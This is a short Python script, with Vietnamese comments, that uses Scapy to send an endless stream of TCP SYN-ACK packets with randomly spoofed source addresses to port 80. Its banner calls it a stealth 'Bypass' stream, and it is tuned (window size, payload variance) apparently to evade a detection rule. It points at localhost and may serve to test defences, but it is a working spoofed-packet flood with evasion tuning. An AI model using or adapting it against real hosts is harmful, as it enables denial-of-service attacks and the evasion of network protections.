from scapy.all import send, RandShort, Raw
from scapy.layers.inet import IP, TCP
import random
import time

# Chĩa vào Loopback localhost
TARGET_IP = "127.0.0.1"
TARGET_PORT = 80

print(f"[*] Bắt đầu luồng tàng hình Bypass ID:3527 vào {TARGET_IP}...")


def send_stealth_packet():
    while True:
        spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

        ip_layer = IP(src=spoofed_ip, dst=TARGET_IP)
        # Cờ SA (ACK=1), Window = 29200
        tcp_layer = TCP(sport=RandShort(), dport=TARGET_PORT, flags="SA", window=29200)

        # Payload 6 bytes để tạo Variance
        payload = Raw(b"X" * 6)

        packet = ip_layer / tcp_layer / payload

        send(packet, verbose=0)
        time.sleep(0.01)


try:
    send_stealth_packet()
except KeyboardInterrupt:
    print("\n[!] Đã dừng luồng Bypass.")